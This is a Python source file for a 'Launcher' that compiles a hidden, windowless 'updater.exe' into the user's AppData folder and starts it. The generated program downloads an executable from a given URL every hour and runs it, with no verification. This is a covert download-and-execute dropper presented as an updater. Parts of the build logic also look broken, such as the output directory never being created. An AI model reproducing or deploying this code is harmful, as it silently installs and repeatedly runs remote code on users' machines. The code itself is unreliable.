import os
import subprocess
import sys
from pathlib import Path

class Launcher:
    def __init__(self, target_path):
        self.target_path = Path(target_path)
        self.updater_dir = Path.home() / "AppData" / "Local" / "AutoUpdater"
        self.updater_exe = self.updater_dir / "updater.exe"

    def create_updater(self):
        # Create spec file for PyInstaller
        spec_content = f"""
# -*- mode: python -*-
a = Analysis(['updater_script.py'],
             pathex=['{self.updater_dir}'],
             hiddenimports=[],
             hookspath=None,
             runtime_hooks=None)
pyz = PYZ(a.pure)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='updater.exe',
          debug=False,
          strip=False,
          upx=True,
          console=False )
        """
        
        # Create updater script
        updater_script = f"""
import requests
import os
import time
import sys
from pathlib import Path

URL = "{self.target_path}"
APP_DIR = Path(r"{self.updater_dir}")

def check_and_update():
    try:
        response = requests.get(URL, stream=True)
        with open(APP_DIR / "target_app.exe", 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        os.startfile(APP_DIR / "target_app.exe")
    except Exception as e:
        print(f"Update failed: {{e}}")

while True:
    check_and_update()
    time.sleep(3600)  # Check every hour
        """
        
        # Save files
        with open(self.updater_dir / "updater_script.py", "w") as f:
            f.write(updater_script)
        
        with open(self.updater_dir / "updater.spec", "w") as f:
            f.write(spec_content)
            
        # Create executable using PyInstaller
        subprocess.run(["pyinstaller", 
                       "--onefile", 
                       "--noconsole", 
                       str(self.updater_dir / "updater.spec")], 
                       cwd=str(self.updater_dir))

    def launch(self):
        self.create_updater()
        if self.updater_exe.exists():
            os.startfile(str(self.updater_exe))
            return True
        return False